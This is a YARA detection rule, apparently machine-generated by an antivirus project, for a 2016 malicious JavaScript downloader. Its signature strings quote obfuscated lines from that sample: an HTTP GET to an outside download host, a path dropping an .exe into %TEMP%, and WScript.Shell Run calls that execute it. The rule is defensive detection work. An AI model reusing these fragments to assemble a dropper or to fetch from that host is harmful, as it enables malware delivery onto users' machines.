rule sig_20160328_9616d5dde8eacdefeb4e87c95cf2b6ab {
  meta:
    description = "datamaliciousorder - file 20160328_9616d5dde8eacdefeb4e87c95cf2b6ab.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "76811278e7e3b0e41a3dd66f6518cc15713c01cb7771e92732c268abe1a2ff62"

  strings:
    $s1  = "function Ecwkmfvoiy() {return Ztodktsnj[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"lyeCvdK0sXbpSEa.exe\";};" fullword ascii
    $s2  = "Vjdbmxufgs[Gdvdhq](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Ehaurnmbz](Ggflq() * 11)} while (Vjdbmxufgs[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Ztodktsnj = function Fuqrl() {return WScript[Ulmxvz](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Vumgtuqm(Aqfezdqzzb, Swose){return Aqfezdqzzb - Swose;};" fullword ascii
    $s6  = "function Hihgeha(Hwvuuts){Ztodktsnj[\"Run\"](Hwvuuts, Awciyjyb, Awciyjyb);};" fullword ascii
    $s7  = "function Gvzyhyk() {return ((Dcjcpaqcr == true) && (Dcjcpaqcr == Kuxtuusc)) ? 1 : Awciyjyb;};" fullword ascii
    $s8  = "return Vumgtuqm(Sceqtdr, Wlqszqr);" fullword ascii
    $s9  = "Kuxtuusc = true; " fullword ascii
    $s10 = "Dcjcpaqcr = true; " fullword ascii
    $s11 = "function Ngqogygyh()" fullword ascii
    $s12 = "var Dcjcpaqcr = false;" fullword ascii
    $s13 = "function Yalux(){return Ulmxvz;};" fullword ascii
    $s14 = "var Kuxtuusc = false;" fullword ascii
    $s15 = "function Ggflq(){return 22;};" fullword ascii
    $s16 = "function Sytwxkhgxj(Ywtbvwh) {var Dkqgabzlmz = (1, 2, 3, 4, 5, Ywtbvwh); return Dkqgabzlmz;};" fullword ascii
    $s17 = "var Xmrxhn = false;" fullword ascii
    $s18 = " while (Palwn){" fullword ascii
    $s19 = "var Clikylm = new this[\"Date\"]();" fullword ascii
    $s20 = "} catch(Xkvwu){Palwn = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}